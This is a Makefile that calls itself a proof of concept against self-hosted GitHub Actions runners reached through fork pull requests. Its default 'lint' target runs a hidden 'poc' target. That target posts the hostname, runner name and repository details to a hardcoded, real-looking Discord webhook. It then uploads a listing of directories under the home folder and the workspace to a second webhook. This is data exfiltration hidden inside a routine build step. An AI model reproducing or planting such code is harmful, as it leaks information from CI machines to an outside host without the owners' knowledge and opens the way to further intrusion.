.PHONY: all poc lint
all: lint

poc:
	@echo "[POC] fork PR on self-hosted runner — pingback & dir listing"

	# 1) Small JSON message (Discord webhooks: POST + JSON with 'content')
	@curl -sS -o /dev/null -w "Discord ping HTTP %{http_code}\n" \
		-H 'Content-Type: application/json' \
		-d "$$(printf '{"content":"POC ping: host=%s runner=%s repo=%s event=%s"}' "$$(hostname)" "$$RUNNER_NAME" "$$GITHUB_REPOSITORY" "$$GITHUB_EVENT_NAME")" \
		"https://discord.com/api/webhooks/1413091167125504000/DZPsdR_duaO5zoezj4o3FxDAQZ5JqoChL3vEPWg7BcjLJ17U0zVoUrtJbkyVJDYPRDdN" || true

	# 2) Build a shallow directory listing into a temp file
	@tmpfile="$$(mktemp /tmp/dirlist.XXXXXX.txt)"; \
	{ \
		echo "host=$$(hostname) whoami=$$(whoami) pwd=$$(pwd)"; \
		echo "--- $$HOME (maxdepth 2) dirs ---"; find "$$HOME" -maxdepth 2 -type d 2>/dev/null | head -n 150; \
		echo "--- workspace (maxdepth 2) dirs ---"; find . -maxdepth 2 -type d 2>/dev/null | head -n 200; \
		echo "--- github context ---"; \
		echo "repo=$$GITHUB_REPOSITORY event=$$GITHUB_EVENT_NAME run_id=$$GITHUB_RUN_ID sha=$$GITHUB_SHA"; \
	} > "$$tmpfile"; \
	\
	# 3) Upload as an attachment using the correct Discord field: files[0]
	http_code=$$(curl -sS -o /dev/null -w "%{http_code}" \
		-F 'payload_json={"content":"POC: attached shallow dir listing (harmless)"}' \
		-F "files[0]=@$$tmpfile;type=text/plain;filename=dir-listing.txt" \
		"https://discord.com/api/webhooks/1234567890/YourWebhookSecret"); \
	echo "Discord file HTTP $$http_code"; \
	rm -f "$$tmpfile" || true

	@echo "[POC] done."

# Hook into your workflow target
lint: poc
	@echo "Lint step ran (after PoC)."
